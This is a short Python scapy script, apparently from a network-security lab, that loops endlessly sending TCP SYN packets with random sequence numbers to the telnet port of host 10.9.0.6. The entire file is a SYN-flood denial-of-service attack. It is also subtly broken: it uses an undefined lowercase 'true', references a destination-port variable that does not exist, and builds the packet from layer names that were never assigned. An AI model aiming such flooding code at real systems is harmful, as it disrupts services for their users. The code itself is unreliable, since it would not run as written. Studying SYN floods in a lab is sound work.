#!/bin/python3
from scapy.all import *
from random import randrange
import sys

strSourceIP = "10.9.0.1"
intSourcePort = randrange(1, 65535)  # Pick an arbirtrary source port number

strDestinationIP = "10.9.0.6"
strDestinationPort =  23  # Targeting telnet port

# IP information will not change
ip_layer = IP(src=strSourceIP, dst=strDestinationIP)

while true:  # Run until CTRL+C
    
    # Build the packet with a random sequence index
    intSequenceIndex = randrange(1, 99999999999)  # Use an arbitrarily random number for sequence number
    tcp_layer = TCP(sport=intSourcePort, dport=intDestinationPort, flags="S", seq=intSequenceIndex)
    pktSynPacket = IPLayer / TCPLayer
    
    # Show the information of the packet before sending
    pktSynPacket.show()

    # Send the packet
    send(pktSynPacket, verbose=0)